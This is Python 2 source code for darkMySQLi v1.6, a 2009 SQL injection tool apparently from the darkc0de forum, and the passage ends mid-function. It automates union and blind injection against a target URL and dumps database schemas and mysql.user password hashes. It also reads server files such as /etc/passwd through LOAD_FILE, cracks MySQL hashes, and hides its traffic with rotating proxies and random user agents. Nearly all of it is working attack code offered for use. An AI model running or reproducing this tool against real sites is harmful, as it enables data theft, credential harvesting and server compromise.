#!/usr/bin/env python2
#     1/30/09
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################
# Multi-Purpose MySQL Injection Tool
# FUNCTIONS
#  *union injection
#  *blind injection
#  *post and get method injection ** POST not working yet
#  *full information_schema enumeration
#  *table and column fuzzer
#  *database information extractor
#  *column length finder
#  *load_file fuzzer
#  *general info gathering
#  *MySQL hash cracker
# FEATURES
#  *Round Robin Proxy w/ a proxy list (non-auth or auth proxies)
#  *Proxy Auth (works great with Squid w/ basic auth)
#  *Random browser agent chosen everytime the script runs
#  *debug mode for seeing every URL request, proxy used, browser agent used

# Share the c0de! (f*ck Windows! Get a real OS!)

# darkc0de Crew
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, Tarsian, c0mrade (r.i.p brotha), reverenddigitalx, rechemen
# and the darkc0de crew

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

# CHANGES
# 1.6 ADDED --end evasion setting
# 1.5 Fixed --strart now starts at correct number instead of +1
# 1.4 Fixed schema mode when a table was specified - app would hand after last column
# 1.3 Fixed Regular Expression Search in dump mode (should fixs issues of crazy html code when dumping)
# 1.2 Fixed mode findcol - the way it replaced darkc0de in the output URL string 

# BE WARNED, THIS TOOL IS VERY LOUD..

import urllib, sys, re, os, socket, httplib, urllib2, time, random

##Set default evasion options here
arg_end = "--" # examples "--", "/*", "#", "%00", "--&SESSIONID=00hn3gvs21lu5ke2f03bxr" <-- if you need vars after inj point
arg_eva = "+" # examples "/**/" ,"+", "%20"
## colMax variable for column Finder
colMax = 200
## Set the default timeout value for requests
socket.setdefaulttimeout(10)
## Default Log File Name
logfile = "darkMySQLi.log"
## File Location to fuzz with for TABLE fuzzer
tablefuzz = "/usr/share/darkmysqli/tablesfuzz.txt"
## File Location to fuzz with for COLUMN fuzzer
columnfuzz = "/usr/share/darkmysqli/columnsfuzz.txt"
## File Location to fuzz with for LOAD_FILE fuzzer
loadfilefuzz = "/usr/share/darkmysqli/loadfilefuzz.txt"
## Agents
agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Opera/8.00 (Windows NT 5.1; U; en)"]

#URL Get Function
def GetThatShit(head_URL):
        source = ""
        global gets;global proxy_num
        head_URL = head_URL.replace("+",arg_eva)
        request_web = urllib2.Request(head_URL)
        request_web.add_header('User-Agent',agent)
        while len(source) < 1:
                if arg_debug == "on":
                        print "\n[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                try:
                        gets+=1;proxy_num+=1
                        source = proxy_list[proxy_num % proxy_len].open(request_web).read()
                except (KeyboardInterrupt, SystemExit):
                        raise
                except (urllib2.HTTPError):
                        print "[-] Unexpected error:", sys.exc_info()[0],"\n[-] Trying again!"
                        print "[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                        break
                except:
                        print "[-] Unexpected error:", sys.exc_info()[0],"\n[-] Look at the error and try to figure it out!"
                        print "[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                        raise
        return source

#the guts and glory - Binary Algorithim that does all the guessing for the Blind Methodology
def GuessValue(URL):
        lower = lower_bound;upper = upper_bound
        while lower < upper:
                try:
                        mid = (lower + upper) / 2
                        head_URL = URL + ">"+str(mid)
                        source = GetThatShit(head_URL)
                        match = re.findall(arg_string,source)
                        if len(match) >= 1:
                                lower = mid + 1
                        else:
                                upper = mid                    
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass

        if lower > lower_bound and lower < upper_bound:
                value = lower
        else:
                head_URL = URL + "="+str(lower)
                source = GetThatShit(head_URL)
                match = re.findall(arg_string,source)
                if len(match) >= 1:
                        value = lower
                else:
                        value = 63
                        print "Could not find the ascii character! There must be a problem.."
                        print "Check to make sure your using the my script right!"
                        print "READ xprog's blind sql tutorial!\n"
                        sys.exit(1)
        return value

## Functions for MySQL5 hash cracking --- THANKS d3hydr8
def c1(word): 
	s = hashlib.sha1() 
	s.update(word[:-1]) 
	s2 = hashlib.sha1() 
	s2.update(s.digest()) 
	return s2.hexdigest() 
 
def c2(word): 
	s = sha.new() 
	s.update(word[:-1]) 
	s2 = sha.new() 
	s2.update(s.digest()) 
	return s2.hexdigest()

## Funtion for MySQL323 hash cracking
def mysql323(clear):
    # Taken almost verbatim from mysql's source
    nr = 1345345333
    add = 7
    nr2 = 0x12345671
    retval = ""
    for c in clear:
	if c == ' ' or c == '\t':
	    continue
	tmp = ord(c)
	nr ^= (((nr & 63) + add) * tmp) + (nr << 8)
	nr2 += (nr2 << 8) ^ nr
	add += tmp
    res1 = nr & ((1 << 31) - 1)
    res2 = nr2 & ((1 << 31) - 1)
    return "%08lx%08lx" % (res1, res2)
    
#say hello
if len(sys.argv) <= 1:
        print "\n|--------------------------------------------------|"
        print "| rsauron@gmail.com                         v1.6   |"
        print "|   1/2009      darkMySQLi.py                      |"
        print "|     -- Multi Purpose MySQL Injection Tool --     |"
        print "| Usage: darkMySQLi.py [options]                   |"
        print "|                      -h help       darkc0de.com  |"
        print "|--------------------------------------------------|\n"
        sys.exit(1)

#help option
for arg in sys.argv:
        if arg == "-h" or arg == "--help":
                print "\n       darkMySQLi v1.6                         rsauron@gmail.com"
                print "                                              forum.darkc0de.com"
                print "Usage: ./darkMySQLi.py [options]"
                print "Options:"
                print "  -h, --help           shows this help message and exits"
                print "  -d, --debug          display URL debug information\n"
                print "  Target:"
                print "    -u URL, --url=URL  Target url\n"
                print "  Methodology:"
                print "    -b, --blind        Use blind methodology (req: --string)"
                print "    -s, --string       String to match in page when the query is valid"
                print "  Method:"
                print "    --method=PUT       Select to use PUT method ** NOT WORKING"
                print "  Modes:"
                print "    --dbs              Enumerate databases           MySQL v5+"
                print "    --schema           Enumerate Information_schema (req: -D,"
                print "                       opt: -T)                      MySQL v5+"
                print "    --full             Enumerate all we can          MySQL v5+"
                print "    --info             MySQL Server configuration    MySQL v4+"
                print "    --fuzz             Fuzz Tables & Columns Names   MySQL v4+"
                print "    --findcol          Find Column length            MySQL v4+"
                print "    --dump             Dump database table entries  (req: -T,"
                print "                       opt: -D, -C, --start)         MySQL v4+"
                print "    --crack=HASH       Crack MySQL Hashs (req: --wordlist)"
                print "    --wordlist=LIS.TXT Wordlist to be used for cracking"
                print "  Define:"
                print "    -D DB              database to enumerate"
                print "    -T TBL             database table to enumerate"
                print "    -C COL             database table column to enumerate"
                print "  Optional:"
                print "    --ssl              To use SSL"
                print "    --end              To use   +  and -- for the URLS --end \"--\" (Default)"
                print "                       To use /**/ and /* for the URLS --end \"/*\""
                print "    --rowdisp          Do not display row # when dumping"
                print "    --start=ROW        Row number to begin dumping at"
                print "    --where=COL,VALUE  Use a where clause in your dump"
                print "    --orderby=COL      Use a orderby clause in your dump"
                print "    --cookie=FILE.TXT  Use a Mozilla cookie file"
                print "    --proxy=PROXY      Use a HTTP proxy to connect to the target url"
                print "    --output=FILE.TXT  Output results of tool to this file\n"
                sys.exit(1)

#define variables
site = ""
proxy = "None"
arg_string = ""
arg_blind = "--union"
arg_table = "None"
arg_database = "None"
arg_columns = "None"
arg_row = "Rows"
arg_cookie = "None"
arg_insert = "None"
arg_where = ""
arg_orderby = ""
arg_debug = "off"
arg_rowdisp = 1
arg_adminusers = 10
arg_wordlist = ""
arg_ssl = "off"
arg_proxy_auth = ""
darkc0de = "concat(0x1e,0x1e,"
mode = "None"
lower_bound = 0
upper_bound = 16069
line_URL = ""
count_URL = ""
cur_db = ""
cur_table = ""
terminal = ""
count = 0
gets = 0
table_num = 0
num = 0
ser_ver = 3
version =[]
let_pos = 1
lim_num = 0
agent = ""

#Check args
for arg in sys.argv:
	if arg == "-u" or arg == "--url":
		site = sys.argv[count+1]
	elif arg == "--output":
		logfile = sys.argv[count+1]
	elif arg == "--proxy":
		proxy = sys.argv[count+1]
        elif arg == "--proxyauth":
                arg_proxy_auth = sys.argv[count+1]
	elif arg == "--dump":
                mode = arg;arg_dump = sys.argv[count]
        elif arg == "--full":
                mode = arg
        elif arg == "--schema":
                mode = arg;arg_schema = sys.argv[count]
        elif arg == "--dbs":
                mode = arg;arg_dbs = sys.argv[count]
        elif arg == "--fuzz":
                mode = arg;arg_fuzz = sys.argv[count]
        elif arg == "--info":
                mode = arg;arg_info = sys.argv[count]
        elif arg == "--crack":
                mode = arg;arg_hash = sys.argv[count+1]
        elif arg == "--wordlist":
                arg_wordlist = sys.argv[count+1] 
        elif arg == "--findcol":
                mode = arg;arg_findcol = sys.argv[count]
        elif arg == "--cookie":
                arg_cookie = sys.argv[count+1]
        elif arg == "--ssl":
                arg_ssl = "on"
        elif arg == "-b" or arg == "--blind":
                arg_blind = arg;arg_blind = sys.argv[count]
	elif arg == "-s" or arg == "--string":
                arg_string = sys.argv[count+1]
	elif arg == "-D":
		arg_database = sys.argv[count+1]
	elif arg == "-T":
		arg_table = sys.argv[count+1]
	elif arg == "-C":
		arg_columns = sys.argv[count+1]
	elif arg == "--start":
                num = int(sys.argv[count+1]) - 1
                table_num = num 
        elif arg == "-d" or arg == "--debug":
                arg_debug = "on"
        elif arg == "--where":
                arg_where = sys.argv[count+1]
        elif arg == "--orderby":
                arg_orderby = sys.argv[count+1]
        elif arg == "--rowdisp":
                arg_rowdisp = sys.argv[count]
                arg_rowdisp = 0
	elif arg == "--end":
                arg_end = sys.argv[count+1]
                if arg_end == "--":
                        arg_eva = "+"
                else:
                        arg_eva = "/**/"
	count+=1

#Title write
file = open(logfile, "a")
print "\n|--------------------------------------------------|"
print "| rsauron@gmail.com                         v1.6   |"
print "|   1/2009      darkMySQLi.py                      |"
print "|     -- Multi Purpose MySQL Injection Tool --     |"
print "| Usage: darkMySQLi.py [options]                   |"
print "|                      -h help       darkc0de.com  |"
print "|--------------------------------------------------|\n"

#Arg Error Checking
if mode != "--crack" and site == "":
        print "[-] URL is required!\n[-] Need Help? --help\n"
        sys.exit(1)
if mode == "None":
        print "[-] Mode is required!\n[-] Need Help? --help\n"
        sys.exit(1)
if mode == "--schema" and arg_database == "None":
        print "[-] Must include -D flag!\n[-] Need Help? --help\n"
        sys.exit(1)
if mode == "--dump":
        if arg_table == "None" or arg_columns == "None":
                print "[-] Must include -T and -C flag. -D is Optional\n[-] Need Help? --help\n"
                sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if arg_ssl == "off":
        if site[:4] != "http": 
                site = "http://"+site
else:
        if site[:5] != "https":
                site = "https://"+site
if site.endswith("/*"):
	site = site.rstrip('/*')
if site.endswith("--"):
	site = site.rstrip('--')
if arg_cookie != "None":
        try:
                cj = cookielib.MozillaCookieJar()
                cj.load(arg_cookie)
                cookie_handler = urllib2.HTTPCookieProcessor(cj)
        except:
                print "[!] There was a problem loading your cookie file!"
                print "[!] Make sure the cookie file is in Mozilla Cookie File Format!"
                print "[!] http://xiix.wordpress.com/2006/03/23/mozillafirefox-cookie-format/\n"
                sys.exit(1)
else:
        cookie_handler = urllib2.HTTPCookieProcessor()
if mode != "--findcol" and arg_blind != "--blind" and mode != "--crack" and site.find("darkc0de") == -1: 
	print "[-] Site must contain \'darkc0de\'\n" 
	sys.exit(1)
if arg_blind == "--blind" and arg_string == "":
        print "[-] You must specify a --string when using blind methodology.\n"
        sys.exit(1)
if arg_columns != "None":
        arg_columns = arg_columns.split(",")
if arg_insert != "None":
        arg_insert = arg_insert.split(",")
if mode == "--crack" and arg_wordlist == "":
        print "[-] You must specify a --wordlist to crack with.\n"
        sys.exit(1)
agent = random.choice(agents)

file.write("\n|--------------------------------------------------|")
file.write("\n| rsauron@gmail.com                         v1.6   |")
file.write("\n|   1/2009      darkMySQLi.py                      |")
file.write("\n|     -- Multi Purpose MySQL Injection Tool --     |")
file.write("\n| Usage: darkMySQLi.py [options]                   |")
file.write("\n|                      -h help       darkc0de.com  |")
file.write("\n|--------------------------------------------------|")
        
## MySQL Hash cracking
if mode == "--crack":
        try: 
                arg_wordlist = open(arg_wordlist, "r") 
        except(IOError): 
                print "[-] Error: Check your wordlist path\n";file.write("\n[-] Error: Check your wordlist path\n")
                sys.exit(1)
        if len(arg_hash) != 40 and len(arg_hash) != 16: 
                print "\n[-] Improper hash length\n";file.write("\n\n[-] Improper hash length\n")
                sys.exit(1)
        arg_wordlist = arg_wordlist.readlines() 
        print "[+] Words Loaded:",len(arg_wordlist);file.write("\n[+] Words Loaded: "+str(len(arg_wordlist)))
        if len(arg_hash) == 40:
                print "[+] Detected MySQL v5 Hash:",arg_hash;file.write("\n[+] Detected MySQL v5 Hash: "+arg_hash)
                try: 
                        import hashlib 
                        for word in arg_wordlist: 
                                if arg_hash == c1(word): 
                                        print "\n[!] Password is:",word;file.write("\n\n[!] Password is: "+word)
                                        break
                except(ImportError): 
                        import sha 
                        for word in arg_wordlist: 
                                if arg_hash == c2(word): 
                                        print "\n[!] Password is:",word;file.write("\n\n[!] Password is: "+word)
                                        break
        else:
                print "[+] Detected MySQL v4 Hash:",arg_hash
                print "[+] Try darkc0de hash database @ "
                for word in arg_wordlist:
                        word = word.rstrip("\n")
                        if arg_hash == mysql323(word): 
                                print "\n[!] Password is:",word+"\n";file.write("\n\n[!] Password is: "+word+"\n")
                                break
        print "[-] Finished Searching..\n[-] Done\n";file.write("\n[-] Finished Searching..\n[-] Done\n")
        sys.exit(1)
        
#General Info
print "[+] URL:",site;file.write("\n\n[+] URL: "+site)
print "[+] %s" % time.strftime("%X");file.write("\n[+] %s" % time.strftime("%X"))
print "[+] Evasion:",arg_eva,arg_end;file.write("\n[+] Evasion: "+arg_eva+" "+arg_end)
print "[+] Cookie:", arg_cookie;file.write("\n[+] Cookie: "+arg_cookie)
if site[:5] == "https":
        print "[+] SSL: Yes";file.write("\n[+] SSL: Yes")
else:
        print "[+] SSL: No";file.write("\n[+] SSL: No")
print "[+] Agent:",agent;file.write("\n[+] Agent: "+agent)
        
#Build proxy list
proxy_list = [];proxy_list_count = []
if proxy != "None":
	print "[+] Building Proxy List...";file.write("\n[+] Building Proxy List...")
	for p in proxy: 
		try:
                        match = re.findall(":",p)
                        if len(match) == 3:
                                arg_proxy_auth = []
                                prox = p.split(":")
                                arg_proxy_auth += prox
                        if arg_proxy_auth != "":
                                proxy_auth_handler = urllib2.HTTPBasicAuthHandler()
                                proxy_auth_handler.add_password("none",p,arg_proxy_auth[2],arg_proxy_auth[3])
                                opener = urllib2.build_opener(proxy_auth_handler)
                                opener.open("http://www.google.com")
                                proxy_list.append(urllib2.build_opener(proxy_auth_handler, cookie_handler))
                                proxy_list_count.append(p);arg_proxy_auth = ""
                        else:
                                proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
                                opener = urllib2.build_opener(proxy_handler)
                                opener.open("http://www.google.com")
                                proxy_list.append(urllib2.build_opener(proxy_handler, cookie_handler))
                                proxy_list_count.append(p)
                        if len(match) == 3 or len(match) == 1:
                                print "\tProxy:",p,"- Success";file.write("\n\tProxy:"+p+" - Success")
                        else:
                                print "\tProxy:",p,arg_proxy_auth[2]+":"+arg_proxy_auth[3]+"- Success";file.write("\n\tProxy:"+p+" - Success")
		except:
			print "\tProxy:",p,"- Failed [ERROR]:",sys.exc_info()[0];file.write("\n\tProxy:"+p+" - Failed [ERROR]: "+str(sys.exc_info()[0]))
			pass
	if len(proxy_list) == 0:
		print "[-] All proxies have failed. App Exiting"
		sys.exit(1) 
	print "[+] Proxy List Complete";file.write("\n[+] Proxy List Complete")
else:
	print "[-] Proxy Not Given";file.write("\n[+] Proxy Not Given")
	proxy_list.append(urllib2.build_opener(cookie_handler))
        proxy_list_count.append("None")
proxy_num = 0
proxy_len = len(proxy_list)

## Blind String checking!
if arg_blind == "--blind":
        print "[!] Blind Methodology will be used!";file.write("\n[!] Blind Methodology will be used!")
        head_URL = site+"+AND+1=1"
        source = GetThatShit(head_URL)
        match = re.findall(arg_string,source)
        if len(match) >= 2:
                print "\n[-] The String you used has been found on the target page in-use more than 2 times"
                print "[-] This might lead to false positives with the blind methodology"
                print "[-] Might not mean anything.. I am just trying to help out.."
                print "[-] If you have problems you might know why.. ;-)\n"
        if len(match) == 0:
                print "\n[-] The String you used has not been found in the target URL!\n[-] Please try another.\n[-] Done.\n"
                sys.exit(1)
        if len(match) == 1:
                print "[+] Blind String Selected is Good ;-)";file.write("\n[+] Blind String Selected is Good ;-)")
                
#Column Finder c0de
if mode == "--findcol":
        print "[+] Attempting To find the number of columns...";file.write("\n[+] Attempting To find the number of columns...")
        print "[+] Testing: ",
        file.write("\n[+] Testing: ",)
        checkfor=[];nullFound=[];nullnum=[];makepretty = ""
        sitenew = site+"+AND+1=2+UNION+SELECT+"
        for x in xrange(1,colMax):
                try:
                        sys.stdout.write("%s," % (x))
                        file.write(str(x)+",")
                        sys.stdout.flush()
                        darkc0de = "dark"+str(x)+"code"
                        checkfor.append(darkc0de)  
                        if x > 1: 
                                sitenew += ","
                        sitenew += "0x"+darkc0de.encode("hex")	
                        finalurl = sitenew+arg_end
                        source = GetThatShit(finalurl)
                        for y in checkfor:
                                colFound = re.findall(y,source)
                                if len(colFound) != 0:
                                        nullFound.append(colFound[0])
                        if len(nullFound) >= 1:
                                print "\n[+] Column Length is:",len(checkfor);file.write("\n[+] Column Length is: "+str(len(checkfor)))
                                print "[+] Found null column at column #: ",;file.write("\n[+] Found null column at column #: ",)
                                for z in nullFound:
                                        nullcol = re.findall(("\d+"),z)
                                        nullnum.append(nullcol[0])
                                        sys.stdout.write("%s," % (nullcol[0]))
                                        file.write(str(nullcol[0])+",")
                                        sys.stdout.flush()
                                for z in xrange(0,len(checkfor)):
                                        z+=1
                                        if z > 1:
                                                makepretty += ","
                                        makepretty += str(z)
                                site = site+arg_eva+"AND"+arg_eva+"1=2"+arg_eva+"UNION"+arg_eva+"SELECT"+arg_eva+makepretty+arg_end
                                print "\n\n[!] SQLi URL:",site;file.write("\n\n[!] SQLi URL: "+site)
                                for z in nullnum:
                                        site = site.replace("+"+z+",","+darkc0de,")
                                        site = site.replace(","+z+",",",darkc0de,")
                                        site = site.replace(","+z+arg_end,",darkc0de"+arg_end)
                                print "[!] darkMySQLi URL:",site;file.write("\n[!] darkMySQLi URL: "+site)
                                print "\n[-] %s" % time.strftime("%X");file.write("\n\n[-] [%s]" % time.strftime("%X"))
                                print "[-] Total URL Requests:",gets;file.write("\n[-] Total URL Requests: "+str(gets))
                                print "[-] Done\n";file.write("\n[-] Done\n")
                                print "Don't forget to check", logfile,"\n"
                                file.close();sys.exit(1)
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
                        
        print "\n[!] Sorry Column Length could not be found."
        file.write("\n[!] Sorry Column Length could not be found.")
        print "[-] You might try to change colMax variable or change evasion option.. or last but not least do it manually!"
        print "[-] Done\n"
        sys.exit(1)

#Retrieve version:user:database
if arg_blind != "--blind":
        head_URL = site.replace("darkc0de","concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
        print "[+] Gathering MySQL Server Configuration...";file.write("\n[+] Gathering MySQL Server Configuration...\n")
        source = GetThatShit(head_URL)
        match = re.findall("\x1e\x1e\S+",source)
        if len(match) >= 1: 
                match = match[0][0:].split("\x1e")
                version = match[2]
                user = match[3]
                database = match[4]
                print "\tDatabase:", database;file.write("\tDatabase: "+database+"\n")
                print "\tUser:", user;file.write("\tUser: "+user+"\n")
                print "\tVersion:", version;file.write("\tVersion: "+version)
        else:
                print "\n[-] There seems to be a problem with your URL. Please check and try again.\n[DEBUG]:",head_URL.replace("+",arg_eva),"\n"
                sys.exit(1)
else:
        print "[+] Preforming Quick MySQL Version Check...";file.write("\n[+] Preforming Quick MySQL Version Check...")
        while 1:
                config_URL = site+"+and+substring(@@version,1,1)="+str(ser_ver)
                source = GetThatShit(config_URL)
                match = re.findall(arg_string,source)
                if len(match) >= 1:
                        print "\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!";file.write("\n\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!")
                        version += str(ser_ver)
                        break
                if ser_ver == 6:
                        print "[-] Was unable to determine MySQL version.\n[-] Done"
                        sys.exit(1)
                ser_ver+=1
                
#lets check what we can do based on version
if mode == "--schema" or mode == "--dbs" or mode == "--full":
        if version[0] == str(4):
                print "\n[-] Mode Selected is incompatible with MySQL v4 Servers"
                print "[-] -h for help"
                sys.exit(1)

# Mode --info
if mode == "--info" and arg_blind != "--blind":
        head_URL = site.replace("darkc0de","0x"+"darkc0de".encode("hex"))+"+FROM+mysql.user"+arg_end
        source = GetThatShit(head_URL)
        match = re.findall("darkc0de",source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to MySQL Database:",yesno;file.write("\n\n[+] Do we have Access to MySQL Database: "+str(yesno))
        if yesno == "YES <-- w00t w00t":
                print "\n[+] Dumping MySQL user info. host:user:password";file.write("\n\n[+] Dumping MySQL user info. host:user:password")
                head_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")+"+FROM+mysql.user"+arg_end
                source = GetThatShit(head_URL)
                match = re.findall("\x1e\x1e\S+",source);match = match[0].strip("\x1e").split("\x1e");userend = match[0]
                print "[+] Number of users in the mysql.user table:",userend;file.write("[+] Number of users in the mysql.user table: "+str(userend))
                head_URL = site.replace("darkc0de","concat(0x1e,0x1e,host,0x1e,user,0x1e,password,0x1e,0x20)")
                head_URL = head_URL+"+FROM+mysql.user+LIMIT+NUM,1"+arg_end
                for x in range(0,int(userend)):
                        try: 
                                source = GetThatShit(head_URL.replace("NUM",str(x)))
                                match = re.findall("\x1e\x1e\S+",source)
                                match = match[0].strip("\x1e").split("\x1e")
                                if len(match) != 3:
                                        nullvar = "NULL"
                                        match += nullvar
                                print "\t["+str(x)+"]",match[0]+":"+match[1]+":"+match[2];file.write("\n["+str(x)+"] "+str(match[0])+":"+str(match[1])+":"+str(match[2]))
                        except (KeyboardInterrupt, SystemExit):
                                raise
                        except:
                                pass
        else:
                print "\n[-] MySQL user enumeration has been skipped!\n[-] We do not have access to mysql DB on this target!"
                file.write("\n\n[-] MySQL user enumeration has been skipped!\n[-] We do not have access to mysql DB on this target!")
        head_URL = site.replace("darkc0de","concat(load_file(0x2f6574632f706173737764),0x3a,0x6461726b63306465)")+arg_end
        source = GetThatShit(head_URL)
        match = re.findall("darkc0de",source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to Load_File:",yesno;file.write("\n\n[+] Do we have Access to Load_File: "+str(yesno))
        if yesno == "YES <-- w00t w00t":
                fuzz_load = open(loadfilefuzz, "r").readlines()
                head_URL = site.replace("darkc0de","concat(load_file('%2Fetc%2Fpasswd'),0x3a,0x6461726b63306465)")+arg_end
                source = GetThatShit(head_URL)
                match = re.findall("darkc0de",source)
                if len(match) > 1:
                        onoff = "OFF <-- w00t w00t"
                else:
                        onoff = "ON"		
                print "\n[+] Magic quotes are:",onoff
                yesno = str(raw_input("\n[!] Would You like to fuzz LOAD_FILE (Yes/No): "))
                if yesno == "Y" or yesno == "y" or yesno == "Yes" or yesno == "yes":
                        print "\n[+] Starting Load_File Fuzzer...";file.write("\n\n[+] Starting Load_File Fuzzer...")
                        print "[+] Number of system files to be fuzzed:",len(fuzz_load),"\n";file.write("\n[+] Number of tables names to be fuzzed: "+str(len(fuzz_load))+"\n")
                        for sysfile in fuzz_load:
                                sysfile = sysfile.rstrip("\n")
                                if proxy != "None":
                                        sysfile = sysfile.replace("/","%2F")
                                        sysfile = sysfile.replace(".","%2E")
                                if onoff == "OFF <-- w00t w00t":
                                        head_URL = site.replace("darkc0de","concat(LOAD_FILE(\'"+sysfile+"\'),0x3a,0x6461726b63306465)")+arg_end
                                else:
                                        head_URL = site.replace("darkc0de","concat(LOAD_FILE(0x"+sysfile.encode("hex")+"),0x3a,0x6461726b63306465)")+arg_end
                                source = GetThatShit(head_URL)
                                match = re.findall("darkc0de",source)
                                if len(match) > 0:
                                    print "[!] Found",sysfile;file.write("\n[!] Found "+sysfile)
                                    head_URL = head_URL.replace("concat(","")
                                    head_URL = head_URL.replace(",0x3a,0x6461726b63306465)","")
                                    print "[!]",head_URL;file.write("\n[!] "+head_URL)
        else:
                print "\n[-] Load_File Fuzzer has been by skipped!\n[-] Load_File disabled on this target!"
                file.write("\n\n[-] Load_File Fuzzer has been by skipped!\n[-] Load_File disabled on this target!")        

#Fuzz table/columns
if mode == "--fuzz":
        fuzz_tables = open(tablefuzz, "r").readlines()
        fuzz_columns = open(columnfuzz, "r").readlines()
        print "[+] Beginning table and column fuzzer...";file.write("[+] Beginning table and column fuzzer...")
        print "[+] Number of tables names to be fuzzed:",len(fuzz_tables);file.write("\n[+] Number of tables names to be fuzzed: "+str(len(fuzz_tables)))
        print "[+] Number of column names to be fuzzed:",len(fuzz_columns);file.write("\n[+] Number of column names to be fuzzed: "+str(len(fuzz_columns)))
        print "[+] Searching for tables and columns...";file.write("\n[+] Searching for tables and columns...")
        if arg_blind == "--blind":
                fuzz_URL = site+"+and+(SELECT+1+from+TABLE+limit+0,1)=1"
        else:
                fuzz_URL = site.replace("darkc0de","0x"+"darkc0de".encode("hex"))+"+FROM+TABLE"+arg_end
        for table in fuzz_tables:
                table = table.rstrip("\n")
                table_URL = fuzz_URL.replace("TABLE",table)
                source = GetThatShit(table_URL)
                if arg_blind == "--blind":
                        match = re.findall(arg_string,source)
                else:
                        match = re.findall("darkc0de", source);
                if len(match) > 0:
                        print "\n[!] Found a table called:",table;file.write("\n\n[+] Found a table called: "+str(table))
                        print "\n[+] Now searching for columns inside table \""+table+"\"";file.write("\n\n[+] Now searching for columns inside table \""+str(table)+"\"")
                        if arg_blind == "--blind":
                                table_URL = site+"+and+(SELECT+substring(concat(1,COLUMN),1,1)+from+"+table+"+limit+0,1)=1"
                        for column in fuzz_columns:
                                column = column.rstrip("\n")
                                if arg_blind == "--blind":
                                        column_URL = table_URL.replace("COLUMN",column)
                                else:
                                        column_URL = table_URL.replace("0x6461726b63306465","concat(0x6461726b63306465,0x3a,"+column+")")
                                source = GetThatShit(column_URL)
                                if arg_blind == "--blind":
                                        match = re.findall(arg_string,source)     
                                else:
                                        match = re.findall("darkc0de",source)
                                if len(match) > 0:
                                        print "[!] Found a column called:",column;file.write("\n[!] Found a column called:"+column)	
                        print "[-] Done searching inside table \""+table+"\" for columns!";file.write("\n[-] Done searching inside table \""+str(table)+"\" for columns!")

#Build URLS for each different mode
if mode == "--schema":
	if arg_database != "None" and arg_table == "None":
                if arg_blind == "--blind":
                        print "[+] Showing Tables from database \""+arg_database+"\"";file.write("\n[+] Showing Tables from database \""+arg_database+"\"")
                        count_URL = site+"+and+((SELECT+COUNT(table_name)"
                        count_URL += "+FROM+information_schema.TABLES+WHERE+table_schema=0x"+arg_database.encode("hex")+"))"
                        line_URL = site+"+and+ascii(substring((SELECT+table_name"
                        line_URL += "+FROM+information_schema.TABLES+WHERE+table_schema=0x"+arg_database.encode("hex")
                else:
                        print "[+] Showing Tables & Columns from database \""+arg_database+"\""
                        file.write("\n[+] Showing Tables & Columns from database \""+arg_database+"\"")
                        line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
                        line_URL += "+FROM+information_schema.columns+WHERE+table_schema=0x"+arg_database.encode("hex")
                        count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(table_schema),0x1e,0x20)")
                        count_URL += "+FROM+information_schema.tables+WHERE+table_schema=0x"+arg_database.encode("hex")
                arg_row = "Tables"
        if arg_database != "None" and arg_table != "None":
                if arg_blind == "--blind":
                        print "[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\""
                        file.write("\n[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\"")
                        count_URL = site+"+and+((SELECT+COUNT(column_name)"
                        count_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")+"))"
                        line_URL = site+"+and+ascii(substring((SELECT+column_name"
                        line_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")
                else:
                        print "[+] Showing Columns from Database \""+arg_database+"\" and Table \""+arg_table+"\""
                        file.write("\n[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\"")
                        line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
